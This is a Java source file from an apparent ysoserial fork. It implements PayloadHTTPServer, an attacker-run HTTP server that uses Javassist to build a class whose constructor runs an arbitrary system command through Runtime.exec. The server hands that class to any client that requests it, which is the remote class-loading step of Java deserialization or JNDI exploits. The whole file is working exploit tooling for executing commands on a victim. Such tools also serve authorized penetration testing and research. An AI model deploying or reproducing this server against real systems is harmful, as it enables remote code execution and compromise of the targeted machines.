package ysoserial.exploit;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtNewConstructor;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;

/**
 * @author wh1t3P1g
 * @since 2020/2/5
 */
public class PayloadHTTPServer implements Runnable{

    private int port;
    private String classname;
    private String command;

    public PayloadHTTPServer(int port, String classname, String command) {
        this.port = port;
        this.classname = classname;
        this.command = command;
    }

    public static void main(String[] args) {
        if ( args.length < 3 ) {
            System.err.println(PayloadHTTPServer.class.getName() + " <port> <classname> <command>");
            System.exit(-1);
            return;
        }

        int port = Integer.parseInt(args[0]);
        String classname = args[1];
        String command = args[2];

        PayloadHTTPServer server = new PayloadHTTPServer(port, classname, command);
        server.run();
    }

    public void run(){
        try {
            System.err.println("* Opening Payload HTTPServer on " + port);
            HttpServer server = HttpServer.create(new InetSocketAddress(port), 0);
            server.createContext("/"+classname+".class", new PayloadHandler(classname, command));
            server.setExecutor(null);
            server.start();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    static class PayloadHandler implements HttpHandler {

        private String classname;
        private String command;
        private byte[] obj;

        public PayloadHandler(String classname, String command) throws Exception{
            this.classname = classname;
            this.command = command;
            generate();
        }

        private void generate() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            CtClass cc = pool.makeClass(classname);

            String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
            // create a default constructor
            // and insert runtime payload to execute system command
            CtConstructor constructor = CtNewConstructor.defaultConstructor(cc);
            constructor.insertAfter(cmd);
            cc.addConstructor(constructor);
            this.obj = cc.toBytecode();
        }

        @Override
        public void handle(HttpExchange exchange) throws IOException {
            System.err.println("Have request from "+exchange.getRemoteAddress());
            System.err.println("Get request <"+exchange.getRequestMethod()+"> "+exchange.getRequestURI());
            exchange.sendResponseHeaders(200, obj.length);
            OutputStream os = exchange.getResponseBody();
            os.write(obj);
            os.close();
            System.err.println("return payload and close");
        }
    }
}
